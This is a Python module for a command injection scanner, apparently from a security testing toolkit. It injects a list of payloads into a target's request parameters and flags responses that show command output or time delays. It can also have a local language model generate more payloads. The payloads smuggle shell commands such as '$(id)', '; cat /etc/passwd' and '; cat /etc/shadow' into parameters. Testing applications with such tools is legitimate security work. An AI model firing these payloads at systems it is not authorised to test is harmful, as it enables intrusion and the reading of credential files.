import re
import requests
import time
from urllib.parse import urlparse, urlencode, parse_qs
from utils.output import section, info, success, warning, error, result, table
from utils.ollama_helper import OllamaHelper

CMD_PAYLOADS = [
    "; id",
    "; whoami",
    "; ls",
    "; pwd",
    "; cat /etc/passwd",
    "| id",
    "| whoami",
    "| ls",
    "; ping -c 3 127.0.0.1",
    "| ping -c 3 127.0.0.1",
    "`id`",
    "`whoami`",
    "$(id)",
    "$(whoami)",
    "& id &",
    "& whoami &",
    "%0A id",
    "%0A whoami",
    "; echo INJECTED",
    "| echo INJECTED",
    "$(echo INJECTED)",
    "`echo INJECTED`",
    "; sleep 3",
    "| sleep 3",
    "$(sleep 3)",
    "`sleep 3`",
    "& ping -c 5 127.0.0.1 &",
    "| ping -n 3 127.0.0.1",
    "; pwd || whoami",
    "| ls -la /",
    "$(ls -la /)",
    "; cat /etc/shadow 2>&1",
    "| cat /etc/passwd",
    "& type C:\\Windows\\win.ini &",
    "; type C:\\Windows\\win.ini",
    "| type C:\\Windows\\win.ini",
    "`type C:\\Windows\\win.ini`",
    "$(type C:\\Windows\\win.ini)",
]

TIME_THRESHOLD = 2.5


class CommandInjection:
    name = "cmd-injection"
    description = "Command injection vulnerability scanner with time-based and blind detection"

    @staticmethod
    def run(target, params="", method="GET", data="", timeout=10, threads=20, ollama_model=None):
        section(f"Command Injection Scanner: {target}")

        ollama = OllamaHelper(model=ollama_model) if ollama_model else None
        results = {"target": target, "vulnerabilities": [], "total_tests": 0, "findings": 0}
        all_vulns = []

        if not target.startswith(("http://", "https://")):
            target = f"https://{target}"

        test_params = [p.strip() for p in params.split(",") if p.strip()] if params else []
        if not test_params:
            parsed = urlparse(target)
            qs = parse_qs(parsed.query)
            test_params = list(qs.keys())
            if not test_params:
                test_params = ["host", "ip", "domain", "cmd", "command", "exec", "ping", "traceroute", "nslookup", "dig", "query", "search", "url", "path", "file", "dir", "folder"]

        all_payloads = list(CMD_PAYLOADS)
        if ollama and ollama.available:
            info("Ollama: generating command injection payloads...")
            for param in test_params[:3]:
                ai_payloads = ollama.generate_cmd_injection_payloads(param)
                if ai_payloads:
                    seen = set(all_payloads)
                    for p in ai_payloads:
                        if p not in seen:
                            all_payloads.append(p)
                            seen.add(p)
                    info(f"AI generated {len(ai_payloads)} payloads for '{param}'")

        base_url = target
        for param_name in test_params:
            info(f"Testing parameter: {param_name}")
            for payload in all_payloads:
                results["total_tests"] += 1
                try:
                    is_time_based = any(x in payload for x in ["sleep", "ping -c", "ping -n"])
                    req_timeout = max(timeout, 10) if is_time_based else timeout

                    start = time.time()
                    if method.upper() == "POST":
                        post_data = {}
                        if data:
                            for pair in data.split("&"):
                                if "=" in pair:
                                    k, v = pair.split("=", 1)
                                    post_data[k] = v
                        post_data[param_name] = payload
                        resp = requests.post(base_url, data=post_data, timeout=req_timeout,
                            headers={"User-Agent": "Mozilla/5.0"}, allow_redirects=False)
                    else:
                        parsed = urlparse(base_url)
                        qs_params = parse_qs(parsed.query)
                        if param_name in qs_params:
                            qs_params[param_name] = [payload]
                        else:
                            qs_params[param_name] = [payload]
                        new_qs = urlencode(qs_params, doseq=True)
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_qs}"
                        resp = requests.get(test_url, timeout=req_timeout,
                            headers={"User-Agent": "Mozilla/5.0"}, allow_redirects=False)
                    elapsed = time.time() - start

                    body = resp.text
                    is_vuln = False

                    if is_time_based and elapsed >= TIME_THRESHOLD:
                        all_vulns.append({"param": param_name, "payload": payload, "type": "TIME_BASED", "elapsed": f"{elapsed:.1f}s", "status_code": resp.status_code})
                        results["findings"] += 1
                        success(f"[TIME_BASED] {param_name} = {payload[:60]}... ({elapsed:.1f}s)")
                        is_vuln = True

                    for indicator in ["uid=", "gid=", "www-data", "root:", "nt authority", "microsoft windows", "drwxr", "total ", "INJECTED", "LoadProfile"]:
                        if indicator.lower() in body.lower():
                            all_vulns.append({"param": param_name, "payload": payload, "type": "CMD_OUTPUT", "indicator": indicator, "status_code": resp.status_code})
                            results["findings"] += 1
                            success(f"[CMD_OUTPUT] {param_name} = {payload[:60]}... (matched: {indicator})")
                            is_vuln = True
                            break

                    if is_time_based and not is_vuln and elapsed > 2:
                        all_vulns.append({"param": param_name, "payload": payload, "type": "TIME_SUSPICIOUS", "elapsed": f"{elapsed:.1f}s", "status_code": resp.status_code})
                        results["findings"] += 1
                        warning(f"[TIME_SUSPICIOUS] {param_name} = {payload[:60]}... ({elapsed:.1f}s)")

                except requests.exceptions.Timeout:
                    if is_time_based:
                        all_vulns.append({"param": param_name, "payload": payload, "type": "TIME_TIMEOUT", "elapsed": "timeout", "status_code": 0})
                        results["findings"] += 1
                        success(f"[TIME_TIMEOUT] {param_name} = {payload[:60]}... (request timed out)")
                except requests.exceptions.RequestException:
                    pass
                except Exception:
                    pass

        if all_vulns:
            result("Total vulnerabilities found", str(len(all_vulns)))
            result("Parameters tested", ", ".join(test_params))

            table(["Parameter", "Type", "Payload", "Status"], [
                [v["param"], v["type"], v["payload"][:50], str(v.get("status_code", ""))] for v in all_vulns[:20]
            ])

            if len(all_vulns) > 20:
                info(f"... and {len(all_vulns) - 20} more findings")
        else:
            warning("No command injection vulnerabilities detected")

        results["vulnerabilities"] = all_vulns
        results["parameters_tested"] = test_params
        return results
